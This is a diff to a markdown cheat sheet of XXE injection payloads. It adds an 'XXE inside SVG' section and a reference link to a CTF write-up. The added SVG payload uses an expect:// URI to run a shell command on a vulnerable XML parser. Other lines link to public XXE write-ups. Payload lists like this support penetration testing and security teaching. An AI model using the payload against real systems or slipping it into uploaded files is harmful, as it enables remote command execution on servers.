@@ -215,6 +215,13 @@ Ref. [brianwrf/CVE-2018-11788](https://github.com/brianwrf/CVE-2018-11788)
 
 ## XXE in exotic files
 
+### XXE inside SVG
+```
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+</svg>
+```
+
 ### XXE inside SOAP
 
 ```xml
@@ -265,3 +272,4 @@ GIF (experimental)
 * [XXE through SAML](https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf)
 * [XXE in Uber to read local files](https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html)
 * [XXE by SVG in community.lithium.com](http://esoln.net/Research/2017/03/30/xxe-in-lithium-community-platform/)
+* [XXE inside SVG](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
